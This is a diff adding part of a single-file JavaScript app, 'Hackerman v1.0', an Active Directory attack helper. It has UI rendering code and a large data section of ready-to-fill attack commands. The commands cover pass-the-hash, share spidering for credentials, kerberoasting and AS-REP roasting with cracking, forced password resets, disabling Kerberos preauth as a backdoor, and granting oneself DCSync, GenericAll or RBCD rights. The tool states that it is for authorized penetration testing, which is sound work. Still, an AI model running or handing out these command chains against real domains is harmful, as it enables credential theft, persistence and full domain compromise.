+      const r = RECIPES.find(x => x.id === id);
+      if(!r) return;
+      out += '\n**' + r.title + '**\n';
+      r.cmds.forEach(c => { out += '\n```sh\n' + renderCommand(c).text + '\n```\n'; });
+    });
+  });
+  return out;
+}
+
+/* ============================== bloodhound tab ============================== */
+function renderBH(){
+  const tab = $('#tab-bh');
+  tab.innerHTML = '';
+  const h1 = document.createElement('h2');
+  h1.className = 'sec'; h1.textContent = 'Collection';
+  tab.appendChild(h1);
+  RECIPES.filter(r => r.cat === 'bh').forEach(r => tab.appendChild(recipeCard(r)));
+
+  const h2 = document.createElement('h2');
+  h2.className = 'sec'; h2.textContent = 'Cypher queries (BloodHound CE / Legacy)';
+  tab.appendChild(h2);
+  CYPHER.forEach(q => {
+    const box = document.createElement('div');
+    box.className = 'cyber';
+    const h = document.createElement('h4'); h.textContent = q.t;
+    box.appendChild(h);
+    if(q.n){
+      const n = document.createElement('div');
+      n.className = 'dim'; n.style.fontSize = '12.3px';
+      n.innerHTML = renderNote(q.n);
+      box.appendChild(n);
+    }
+    const cmd = document.createElement('div');
+    cmd.className = 'cmd';
+    const pre = document.createElement('pre');
+    pre.textContent = q.q;
+    cmd.appendChild(pre);
+    cmd.appendChild(mkCopyBtn(q.q));
+    box.appendChild(cmd);
+    tab.appendChild(box);
+  });
+}
+
+/* ============================== legend tab ============================== */
+function renderLegend(){
+  const tab = $('#tab-legend');
+  tab.innerHTML = '';
+  const about = document.createElement('div');
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.0</h2>' +
+    '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
+    RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
+    '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
+  tab.appendChild(about);
+  const h = document.createElement('h2');
+  h.className = 'sec'; h.textContent = 'Argument colors';
+  tab.appendChild(h);
+  const colors = [
+    ['v-domain','Domain / realm'], ['v-host','Host / DN'], ['v-ip','IP address'],
+    ['v-user','User / account'], ['v-secret','Password'], ['v-hash','NT hash'],
+    ['v-key','AES key'], ['v-spn','SPN / template'], ['v-file','File / path'],
+    ['v-sid','SID'], ['v-num','Port / number'], ['v-flag','Interface / flag'],
+    ['v-proxy','proxychains prefix']
+  ];
+  const t = document.createElement('table');
+  t.className = 'tbl';
+  colors.forEach(([cls, name]) => {
+    const tr = document.createElement('tr');
+    const td1 = document.createElement('td');
+    const sw = document.createElement('span');
+    sw.className = 'swatch'; sw.style.background = 'var(--' + cls + ')';
+    td1.appendChild(sw); td1.appendChild(document.createTextNode(name));
+    const td2 = document.createElement('td');
+    const sp = document.createElement('span'); sp.className = cls; sp.textContent = 'example';
+    td2.appendChild(sp);
+    tr.appendChild(td1); tr.appendChild(td2);
+    t.appendChild(tr);
+  });
+  tab.appendChild(t);
+
+  const h2 = document.createElement('h2'); h2.className = 'sec'; h2.textContent = 'How this works';
+  tab.appendChild(h2);
+  const ul = document.createElement('div');
+  ul.innerHTML =
+    '<p class="dim">Fill the context bar above, every command re-renders with your values. Missing values show up as <span class="v-miss">‹label?›</span> and the card is marked <span class="badge miss">missing</span>.</p>' +
+    '<p class="dim">The <b>proxychains</b> toggle prefixes network commands — commands that must run locally (responder, hashcat, smb server) are exempt.</p>' +
+    '<p class="dim">Progress checkboxes, context and presets live in <span class="mono">localStorage</span> only. Export before switching browser/profile.</p>' +
+    '<p class="dim">Shortcuts: <kbd>/</kbd> search · <kbd>Ctrl/Cmd+K</kbd> focus search · presets in the header.</p>' +
+    '<p class="dim">Version-sensitive syntax (bloodyAD v2 vs v1, nxc modules, certipy 5.x) is noted on the relevant cards — always cross-check <a href="https://www.thehacker.recipes" target="_blank" rel="noreferrer">thehacker.recipes</a>.</p>';
+  tab.appendChild(ul);
+
+  const h3 = document.createElement('h2'); h3.className = 'sec'; h3.textContent = 'All variables';
+  tab.appendChild(h3);
+  const t2 = document.createElement('table');
+  t2.className = 'tbl';
+  const thr = document.createElement('tr');
+  ['Variable', 'Label', 'Placeholder'].forEach(x => { const th = document.createElement('th'); th.textContent = x; thr.appendChild(th); });
+  t2.appendChild(thr);
+  VAR_DEFS.forEach(v => {
+    const tr = document.createElement('tr');
+    const td1 = document.createElement('td');
+    const code = document.createElement('code'); code.className = v.color; code.textContent = '{{' + v.k + '}}';
+    td1.appendChild(code);
+    const td2 = document.createElement('td'); td2.textContent = v.label;
+    const td3 = document.createElement('td'); td3.className = 'dim'; td3.textContent = v.ph || '';
+    tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
+    t2.appendChild(tr);
+  });
+  tab.appendChild(t2);
+}
+
+/* ============================== tabs ============================== */
+let activeTab = 'wizard';
+function renderActiveTab(){
+  if(activeTab === 'wizard') renderWizard();
+  else if(activeTab === 'recipes') renderRecipes();
+  else if(activeTab === 'bh') renderBH();
+  else if(activeTab === 'legend') renderLegend();
+}
+let rt;
+function scheduleRender(){
+  clearTimeout(rt);
+  rt = setTimeout(() => { renderActiveTab(); syncContext(); }, 160);
+}
+
+function initTabs(){
+  $$('#tabs button').forEach(b => {
+    b.addEventListener('click', () => {
+      activeTab = b.dataset.tab;
+      $$('#tabs button').forEach(x => x.classList.toggle('active', x === b));
+      $$('.tab').forEach(x => x.classList.toggle('active', x.id === 'tab-' + activeTab));
+      renderActiveTab();
+    });
+  });
+}
+
+/* ============================== presets / import / export ============================== */
+function refreshPresets(){
+  const sel = $('#presetSel');
+  const cur = sel.value;
+  sel.innerHTML = '<option value="">— presets —</option>';
+  Object.keys(PRESETS).sort().forEach(n => {
+    const o = document.createElement('option');
+    o.value = n; o.textContent = n;
+    sel.appendChild(o);
+  });
+  if(PRESETS[cur]) sel.value = cur;
+}
+
+let modalApply = null;
+function openModal(title, text, applyFn){
+  $('#modalTitle').textContent = title;
+  $('#modalText').value = text;
+  $('#modalText').readOnly = !applyFn;
+  modalApply = applyFn || null;
+  $('#modalApply').style.display = applyFn ? '' : 'none';
+  $('#modal').classList.remove('hidden');
+}
+function closeModal(){ $('#modal').classList.add('hidden'); }
+
+function updateOffsets(){
+  const root = document.documentElement.style;
+  root.setProperty('--headerH', document.querySelector('header').offsetHeight + 'px');
+  root.setProperty('--tabsH', document.querySelector('nav.tabs').offsetHeight + 'px');
+}
+
+function initUI(){
+  updateOffsets();
+  window.addEventListener('resize', updateOffsets);
+  buildContext();
+  buildCatFilter();
+  initTabs();
+  refreshPresets();
+  renderActiveTab();
+
+  $('#ctxToggle').addEventListener('click', () => $('#ctx').classList.toggle('closed'));
+  $('#proxyChk').addEventListener('change', e => {
+    S.proxy = e.target.checked; saveState(); syncContext(); renderActiveTab();
+  });
+  $('#search').addEventListener('input', e => { searchQ = e.target.value.trim().toLowerCase(); renderRecipes(); });
+  document.addEventListener('keydown', e => {
+    if(e.key === '/' && !/INPUT|TEXTAREA|SELECT/.test(document.activeElement.tagName)){
+      e.preventDefault(); $('#search').focus();
+      if(activeTab !== 'recipes') $$('#tabs button').find(b => b.dataset.tab === 'recipes').click();
+    }
+    if((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k'){
+      e.preventDefault();
+      if(activeTab !== 'recipes') $$('#tabs button').find(b => b.dataset.tab === 'recipes').click();
+      $('#search').focus();
+    }
+    if(e.key === 'Escape') closeModal();
+  });
+
+  $('#presetSave').addEventListener('click', () => {
+    const name = prompt('Preset name:', S.domain || 'preset');
+    if(!name) return;
+    PRESETS[name] = JSON.parse(JSON.stringify(S));
+    savePresets(); refreshPresets(); $('#presetSel').value = name; toast('preset saved');
+  });
+  $('#presetSel').addEventListener('change', e => {
+    const n = e.target.value;
+    if(!n || !PRESETS[n]) return;
+    S = Object.assign({}, DEFAULT_STATE, PRESETS[n]);
+    saveState(); syncContext(); renderActiveTab(); toast('preset loaded');
+  });
+  $('#presetDel').addEventListener('click', () => {
+    const n = $('#presetSel').value;
+    if(!n || !PRESETS[n]) return;
+    if(confirm('Delete preset "' + n + '"?')){ delete PRESETS[n]; savePresets(); refreshPresets(); }
+  });
+  $('#resetBtn').addEventListener('click', () => {
+    if(!confirm('Reset context (progress and presets stay)?')) return;
+    S = Object.assign({}, DEFAULT_STATE);
+    saveState(); syncContext(); renderActiveTab();
+  });
+  $('#expBtn').addEventListener('click', () => openModal('Export context (JSON)', JSON.stringify(S, null, 2)));
+  $('#impBtn').addEventListener('click', () => openModal('Import context (paste JSON)', '', txt => {
+    try {
+      const o = JSON.parse(txt);
+      if(typeof o !== 'object' || o === null) throw new Error('not an object');
+      S = Object.assign({}, DEFAULT_STATE, o);
+      saveState(); syncContext(); renderActiveTab(); closeModal(); toast('imported');
+    } catch(e){ toast('invalid JSON'); }
+  }));
+  $('#modalClose').addEventListener('click', closeModal);
+  $('#modalCopy').addEventListener('click', () => copyText($('#modalText').value));
+  $('#modalApply').addEventListener('click', () => { if(modalApply) modalApply($('#modalText').value); });
+}
+
+/* ============================== data ============================== */
+/* ===== RECON & AUTH ===== */
+R({id:'auth-check',cat:'recon',title:'Verify credentials across protocols',desc:'First thing after getting creds — check where they work and with which rights.',
+cmds:[
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}'`,'SMB against DC'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}'`,'LDAP against DC'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}'`,'WinRM'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth`,'local account check'],
+ [`nxc mssql {{target_host}} -u '{{user}}' -p '{{password}}' -d {{domain}}`,'MSSQL']
+],note:'<b>Pwn3d!</b> in nxc output = local admin (or DA on DC). Add <span class="mono">-d {{domain}}</span> whenever the short name is ambiguous.'});
+
+R({id:'pth-check',cat:'recon',title:'Pass-the-Hash auth checks',desc:'NTLM hash instead of a password — no cracking needed.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'SMB PtH'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -H '{{nthash}}' -d {{domain}}`,'SMB PtH against DC'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'WinRM PtH'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}'`,'LDAP PtH'],
+ [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' --local-auth`,'local SAM account PtH']
+],note:'Machine accounts and users both work with PtH. For Kerberos-only services use overpass-the-hash (see Kerberos tab).'});
+
+R({id:'kerb-check',cat:'recon',title:'Authenticate with a ccache (Kerberos)',desc:'Use a ticket you already have — export KRB5CCNAME first.',
+cmds:[
+ [`export KRB5CCNAME={{ccache}}`,'point to the ticket'],
+ [`klist`,'verify ticket / expiry'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache`,'SMB with ccache'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache`,'LDAP with ccache'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -k --use-kcache`,'WinRM with ccache']
+],note:'NetExec resolves the hostname from the ticket — if DNS fails add <span class="mono">--dns-server {{dc_ip}}</span> or put the FQDN in <span class="mono">/etc/hosts</span>.'});
+
+R({id:'shares',cat:'recon',title:'Enumerate shares / spider files',desc:'SMB share access, then recursive spider for loot (configs, scripts, passwords).',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --shares`,'list shares'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M spider_plus`,'spider all readable shares'],
+ [`smbclient -L //{{target_host}} -U '{{user}}%{{password}}'`,'smbclient listing'],
+ [`smbclient //{{target_host}}/SHARE -U '{{user}}%{{password}}' -c 'recurse; ls'`,'browse one share'],
+ [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' --shares`,'shares via PtH']
+],note:'spider_plus loot lands in <span class="mono">/tmp/nxc/spider_plus/&lt;target&gt;.json</span>. Look for <span class="mono">*.ps1, *.bat, *.config, *.xml, unattend.*, web.config</span>.'});
+
+R({id:'user-enum',cat:'recon',title:'Users, groups, password policy',desc:'Map accounts before roasting or ACL hunting.',
+cmds:[
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --users`,'domain users'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --groups`,'domain groups'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --pass-pol`,'password policy (lockout!)'],
+ [`impacket-GetADUsers -all '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'impacket user dump'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'unconstrained delegation accounts']
+],note:'Check the lockout threshold before spraying — <b>thehacker.recipes</b> has the spray rules of thumb.'});
+
+R({id:'anon-enum',cat:'recon',title:'Unauthenticated enumeration',desc:'What is exposed with no or guest credentials.',
+cmds:[
+ [`enum4linux-ng -A {{dc_ip}}`,'full anonymous enum'],
+ [`nxc smb {{dc_ip}} -u '' -p '' --shares`,'null session shares'],
+ [`nxc smb {{dc_ip}} -u 'guest' -p '' --users`,'guest session'],
+ [`nxc ldap {{dc_ip}} -u '' -p ''`,'LDAP bind check'],
+ [`rpcclient -U '' -N {{dc_ip}} -c 'enumdomusers'`,'RPC user enum']
+],note:'Null sessions are rare on modern DCs but cheap to try. <span class="mono">enumdomusers</span> failures often still leak the domain SID via <span class="mono">lookupsid</span>.'});
+
+/* ===== BLOODYAD ===== */
+R({id:'bloodyad-basics',cat:'bloodyad',title:'bloodyAD — auth & object reads',desc:'Swiss army knife for LDAP writes. Three auth styles: password, NT hash, Kerberos.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}' --attr sAMAccountName,userAccountControl`,'password auth + read'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p ':{{nthash}}' get object '{{user}}'`,'pass-the-hash (-p :NTHASH)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'kerberos ccache'],
+ [`bloodyAD --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -k keytab={{keytab}} -f aes get object '{{user}}'`,'kerberos keytab'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '' --attr domainControllerFunctionality`,'rootDSE / schema level']
+],note:'Add <span class="mono">-s</span> for LDAPS, <span class="mono">-v DEBUG</span> for troubleshooting. <span class="mono">get object ""</span> prints the rootDSE.'});
+
+R({id:'bloodyad-writable',cat:'bloodyad',title:'bloodyAD — find what you can write',desc:'Enumerates every object your account has write rights over. Huge shortcut vs BloodHound when you only have one user.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all writable objects'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get writable --detail`,'all writable objects via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype COMPUTER --right WRITE --detail`,'writable computers'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype USER,GROUP --detail`,'writable users/groups'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --otype GPO,DOMAIN --detail`,'writable GPOs / domain object'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --bh`,'export as BloodHound zip']
+],note:'Start every "what now?" moment here. If the output is huge, narrow with <span class="mono">--otype</span> and <span class="mono">--right WRITE</span>.'});
+
+R({id:'bloodyad-spn',cat:'bloodyad',title:'bloodyAD — add / remove SPN (kerberoast + redirect)',desc:'Write access to servicePrincipalName unlocks two attacks: make an account roastable, or move a delegation SPN somewhere more useful.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "fake/spn"`,'A: targeted kerberoast — set SPN (your notes style)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'A: password variant'],
+ [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'A: roast the SPN you just set'],
+ [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'A: crack (no proxy)','n'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'A: cleanup'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'B: redirect delegation SPN to the DC (your notes)'],
+ [`bloodyad --dc-ip {{dc_ip}} -d {{domain}} -u '{{user}}' -k --host {{dc_fqdn}} addspn "{{dc_dn}}" "{{spn}}"`,'B: v1 addspn (your original)'],
+ [`bloodyad --dc-ip {{dc_ip}} -d {{domain}} -u '{{user}}' -k --host {{dc_fqdn}} delspn "{{dn}}" "{{spn}}"`,'B: v1 delspn (your original)']
+],note:'v2 exposes <span class="mono">addspn/delspn</span> under <span class="mono">msldap</span> (v1 used them top-level). The target needs a <b>DN</b>, not a sAMAccountName. Use case <b>A</b> = targeted kerberoast on demand. Use case <b>B</b> = move the SPN that a constrained delegation points at onto the DC — full chain in the <b>SPN hijack</b> recipe.'});
+
+R({id:'bloodyad-password',cat:'bloodyad',title:'bloodyAD — set / change password',desc:'Reset a password with GenericAll / User-Force-Change-Password.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'admin-style reset'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} set password '{{target_user}}' 'Pwn3d123!'`,'reset via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap changeuserpw "{{dn}}" 'Pwn3d123!'`,'change (admin, no old pw)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap changeuserpw "{{dn}}" 'Pwn3d123!' --oldpass '{{password}}'`,'self change'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -p 'Pwn3d123!'`,'verify new creds']
+],note:'Password reset on a user with active sessions/shares can break the lab — prefer shadow credentials or targeted kerberoast when possible.'});
+
+R({id:'bloodyad-uac',cat:'bloodyad',title:'bloodyAD — UAC flags (preauth, disable account)',desc:'UserAccountControl manipulation: kill preauth for AS-REP, unlock/disable accounts.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'remove Kerberos preauth → AS-REP roast'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'remove preauth via ccache'],
+ [`impacket-GetNPUsers '{{domain}}/{{target_user}}' -dc-ip {{dc_ip}} -no-pass -request -outputfile {{hashfile}}`,'roast without preauth'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove uac -f DONT_REQ_PREAUTH '{{target_user}}'`,'restore preauth'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove uac -f ACCOUNTDISABLE '{{target_user}}'`,'enable a disabled account'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add uac -f DONT_EXPIRE_PASSWORD '{{target_user}}'`,'password never expires']
+],note:'DONT_REQ_PREAUTH on an existing user is a classic persistence/backdoor trick — and a fast roast when the user has a weak password.'});
+
+R({id:'bloodyad-groups',cat:'bloodyad',title:'bloodyAD — group membership & rights',desc:'Add members, grant GenericAll / DCSync / RBCD.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add member to group'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{target_user}}'`,'add member via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{target_user}}'`,'remove member (cleanup)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself GenericAll'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'grant yourself DCSync'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD over target']
+],note:'GenericAll/DCSync require you to own the object or hold WriteDacl on it. <span class="mono">add rbcd TARGET SERVICE</span> is the bloodAD one-liner for the delegation write step.'});
+
+R({id:'bloodyad-enum',cat:'bloodyad',title:'bloodyAD — enumerate AD status',desc:'Trusts, children, memberships, DNS, and a quick BloodHound collector.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts`,'domain trusts'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get trusts`,'domain trusts via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get children --otype useronly --target '{{domain}}'`,'users under domain'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{target_user}}'`,'group membership of account'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get dnsDump --zone {{domain}}`,'AD DNS records'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path {{hashfile}}`,'bloodyAD BloodHound collector (basic)']
+],note:'<span class="mono">get writable ./ get trusts</span> are the two commands to run on any new credential — they often beat a full BloodHound run for speed.'});
+
+/* ===== KERBEROS ===== */
+R({id:'keytab',cat:'krb',title:'Keytab → NTLM / AES keys',desc:'Found /etc/krb5.keytab on a Linux box or in a looted backup? Extract the machine account secrets.',
+cmds:[
+ [`klist -k -t {{keytab}}`,'inspect principals in the keytab','n'],
+ [`git clone https://github.com/sosdave/KeyTabExtract.git && cd KeyTabExtract`,'get KeyTabExtract (once)','n'],
+ [`python3 keytabextract.py {{keytab}}`,'extract NTLM + AES hashes','n'],
+ [`impacket-getTGT '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -dc-ip {{dc_ip}}`,'get a TGT with the AES256 key'],
+ [`export KRB5CCNAME={{user}}.ccache && klist`,'use the ticket']
+],note:'Example output from your notes: <span class="mono">SERVICE PRINCIPAL : restrictedkrbhost/prod-dmz.argon.htb</span> → <span class="mono">NTLM HASH : c5f7…f95</span>, <span class="mono">AES-256 HASH : 2c76…dbc</span>. Prefer the <b>AES256 key</b> for Kerberos (RC4 is often disabled); NTLM hash is only useful for PtH/overpass on services that accept it.'});
+
+R({id:'kerberos-auth',cat:'krb',title:'Kerberos auth from Kali — env & per-tool cheat sheet',desc:'Everything that must be in place before -k works, plus the exact invocation for each tool family.',
+cmds:[
+ [`# 1) /etc/krb5.conf — point Kerberos at the KDC (test with KRB5_CONFIG=./krb5.conf)`,'config','n'],
+ [`[libdefaults]
+    default_realm = {{realm}}
+    dns_lookup_kdc = false
+    dns_canonicalize_hostname = false
+    rdns = false
+
+[realms]
+    {{realm}} = {
+        kdc = {{dc_ip}}
+    }
+
+[domain_realm]
+    .{{domain}} = {{realm}}
+    {{domain}} = {{realm}}`,'krb5.conf content (copy)','n'],
+ [`echo '{{dc_ip}}  {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts`,'2) name resolution — Kerberos needs hostnames, not IPs','ns'],
+ [`sudo ntpdate {{dc_ip}}`,'3) clock skew must be < 5 min (or: sudo timedatectl set-ntp true)','ns'],
+ [`kinit '{{user}}@{{realm}}'`,'4) TGT with a password (prompts)'],
+ [`kinit -k -t {{keytab}} '{{user}}$@{{realm}}'`,'TGT from a keytab (machine account, note the $)'],
+ [`klist -e`,'show tickets + encryption types','n'],
+ [`kvno host/{{target_fqdn}}`,'test that a service ticket can be obtained'],
+ [`kdestroy`,'wipe the cache when done','n'],
+ [`KRB5_TRACE=/dev/stderr klist`,'debug Kerberos (verbose trace)','n'],
+ [`# 5) per-tool invocation (KRB5CCNAME must point at your ccache):`,'cheat sheet','n'],
+ [`impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket family: -k -no-pass','n'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -k --use-kcache --dns-server {{dc_ip}}`,'netexec: -k --use-kcache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{user}}'`,'bloodyAD: -k ccache=FILE'],
+ [`certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -stdout`,'certipy: -k -no-pass'],
+ [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}' --use-krb5-ccache={{ccache}} -S {{dc_host}}`,'samba net: --use-krb5-ccache=FILE']
+],note:'Typical failures: <span class="mono">KRB_AP_ERR_SKEW</span> = clock, <span class="mono">KDC_ERR_WRONG_REALM</span> = krb5.conf, <span class="mono">Server not found in Kerberos database</span> = missing /etc/hosts entry or wrong SPN. If <span class="mono">-k</span> is ignored silently, KRB5CCNAME is not set. Kerberos always needs the FQDN; IPs break SPNs. <span class="mono">-no-pass</span> tells impacket not to prompt when using <span class="mono">-k</span>.'});
+
+R({id:'asrep',cat:'krb',title:'AS-REP roasting',desc:'Accounts without Kerberos pre-authentication hand out crackable AS-REP hashes unauthenticated.',
+cmds:[
+ [`impacket-GetNPUsers '{{domain}}/' -usersfile users.txt -dc-ip {{dc_ip}} -request -format hashcat -outputfile {{hashfile}}`,'unauthenticated (userlist)'],
+ [`impacket-GetNPUsers '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request -outputfile {{hashfile}}`,'with valid creds'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --asreproast {{hashfile}}`,'nxc module'],
+ [`hashcat -m 18200 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n'],
+ [`john --format=krb5asrep --wordlist={{wordlist}} {{hashfile}}`,'john alternative','n']
+],note:'BloodHound query for candidates: <span class="mono">MATCH (u:User {dontreqpreauth:true}) RETURN u.name</span>. Output hashes start with <span class="mono">$krb5asrep$23$</span>.'});
+
+R({id:'kerberoast',cat:'krb',title:'Kerberoasting (service accounts)',desc:'Request service tickets for accounts with SPNs and crack them offline.',
+cmds:[
+ [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request -outputfile {{hashfile}}`,'request all TGS hashes'],
+ [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}'`,'single account'],
+ [`impacket-GetUserSPNs '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}} -request -outputfile {{hashfile}}`,'all TGS via ccache (KRB5CCNAME set)'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --kerberoasting {{hashfile}}`,'nxc kerberoasting'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache --kerberoasting {{hashfile}}`,'nxc via ccache'],
+ [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n']
+],note:'Anything with an SPN counts, including machine accounts and the krbtgt-adjacent service accounts. Hashes start with <span class="mono">$krb5tgs$23$</span>.'});
+
+R({id:'targeted-kerberoast',cat:'krb',title:'Targeted kerberoast (write SPN on a user)',desc:'No roastable SPN? Give a user you can write to one, roast, clean up.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'set SPN'],
+ [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'roast'],
+ [`impacket-GetUserSPNs '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}} -request-user '{{target_user}}' -outputfile {{hashfile}}`,'roast via ccache'],
+ [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack (no proxy)','n'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap delspn "{{dn}}" "fake/spn"`,'remove SPN']
+],note:'Great against high-value accounts with weak passwords — no service disruption, fully reversible. Requires GenericWrite/WriteProperty on the SPN attribute.'});
+
+R({id:'gettgt',cat:'krb',title:'getTGT — obtain tickets from secrets',desc:'Turn password / NT hash / AES key into a usable ccache (overpass-the-hash).',
+cmds:[
+ [`impacket-getTGT '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'password'],
